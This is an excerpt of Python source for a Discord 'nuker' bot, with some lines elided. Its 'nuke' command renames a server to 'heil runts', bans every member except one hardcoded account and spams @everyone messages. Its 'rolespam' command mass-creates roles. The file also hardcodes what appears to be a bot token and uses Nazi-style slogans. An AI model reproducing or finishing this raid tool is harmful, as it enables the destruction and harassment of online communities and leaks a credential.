...
token = ' OTUxMDM1MTI3NDg2NjQwMTY4.GU4qtG.zpCuTQf0rheID94d-WmBm23PwEhysajBCnXFpo ' 
channel_names = ['runts runs']
message_spam = ['@everyone heil runts get nuked LOL! discord.gg/']
webhook_names = ['ran by runts', 'heil runts','RuntsW', 'hey guys its runts here back at it with another video
']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "ran by runts " ))#change this if you want
  print(f''' 

 ____  _     _     _____  ____    _     _     _  ___________ 
/  __\/ \ /\/ \  //__ __\/ ___\  / \  // \ /\/ |/ /  __/  __\
|  \/|| | ||| |\ || / \  |    \  | |\ || | |||   /|  \ |  \/|
|    /| \_/|| | \|| | |  \___ |  | | \|| \_/||   \|  /_|    /
\_/\_\\____/\_/  \| \_/  \____/  \_/  \\____/\_|\_\____\_/\_\
...
async def nuke(ctx, amount=50):
  ...
  await ctx.guild.edit(name="heil runts")
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Terminal RunZ Me")
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"runtsran")
